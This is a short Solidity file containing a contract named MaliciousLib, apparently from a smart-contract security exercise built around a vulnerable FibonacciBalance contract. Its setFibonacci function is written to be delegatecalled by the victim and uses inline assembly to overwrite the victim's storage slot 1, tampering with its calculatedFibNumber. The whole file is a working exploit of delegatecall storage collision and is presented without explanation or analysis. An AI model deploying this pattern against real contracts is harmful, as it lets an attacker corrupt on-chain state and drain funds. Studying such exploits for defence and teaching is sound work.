pragma solidity ^0.4.22;

contract MaliciousLib {
    // intentionally declare nothing to avoid confusing storage layout;
    // we'll set storage directly via assembly when delegatecalled.

    // match the signature expected by FibonacciBalance's fibSig: setFibonacci(uint256)
    function setFibonacci(uint n) public {
        // write 5 to storage slot 1 of the CALLING contract (the victim),
        // which corresponds to victim.calculatedFibNumber
        assembly {
            sstore(1, 5)
        }
    }
}
